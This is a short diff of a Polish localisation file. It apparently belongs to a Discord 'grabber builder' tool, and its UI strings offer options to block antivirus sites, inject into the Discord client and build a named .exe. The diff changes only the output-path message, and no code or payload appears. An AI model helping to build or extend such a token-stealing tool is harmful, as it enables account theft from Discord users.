@@ -253,7 +253,7 @@ Blokowanie stron AV (T/N)
 Wstrzyknięcie Discorda (T/N)
 Ikona pliku
 Tworzenie {name}.exe, To zajmie kilka sekund. Dziękujemy za cierpliwość!
-Plik znajduje się w 'output/grabberbuilder/{name}.exe
+Plik znajduje się w {path}
 Utworzono grupowy czat
 Ograniczenie tempa ({response.json()['retry_after']}ms)
 Za mało znajomych dostępnych do losowego wyboru
